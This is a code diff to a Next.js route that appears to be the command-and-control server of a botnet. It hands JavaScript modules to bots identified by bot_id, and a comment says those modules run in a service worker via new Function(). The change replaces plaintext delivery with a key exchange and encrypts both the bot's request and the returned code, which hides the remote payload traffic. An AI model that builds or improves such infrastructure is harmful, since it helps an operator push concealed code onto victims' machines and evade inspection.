@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { readFileSync, existsSync } from "fs";
 import { join } from "path";
+import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";
 
 // Module metadata: maps module names to their execution context
 // "background" = runs in service worker via new Function()
@@ -42,29 +43,37 @@ function getModuleCode(name: string): string | null {
     return null;
 }
 
-export async function GET(request: NextRequest) {
+export async function POST(request: NextRequest) {
     try {
-        const moduleName = request.nextUrl.searchParams.get("name");
-        const botId = request.nextUrl.searchParams.get("bot_id");
+        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
+        if (!botPubKeyB64) {
+            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
+        }
 
-        if (!moduleName || !botId) {
-            return new NextResponse("Missing params", { status: 400 });
+        const sessionKey = await deriveSessionKey(botPubKeyB64);
+
+        const encData = await request.json();
+        if (!encData || !encData.iv || !encData.ciphertext) {
+            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
+        }
+
+        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
+        const { bot_id, name: moduleName } = body;
+
+        if (!moduleName || !bot_id) {
+            return NextResponse.json({ error: "Missing params" }, { status: 400 });
         }
 
         const moduleCode = getModuleCode(moduleName);
 
         if (!moduleCode) {
-            return new NextResponse("Module not found", { status: 404 });
+            return NextResponse.json({ error: "Module not found" }, { status: 404 });
         }
 
-        return new NextResponse(moduleCode, {
-            headers: {
-                "Content-Type": "application/javascript",
-                "Cache-Control": "no-store",
-            },
-        });
+        const encResponse = await encryptPayload(sessionKey, { code: moduleCode });
+        return NextResponse.json(encResponse);
     } catch (e) {
         console.error("Module fetch error:", e);
-        return new NextResponse("Internal error", { status: 500 });
+        return NextResponse.json({ error: "Internal error" }, { status: 500 });
     }
 }
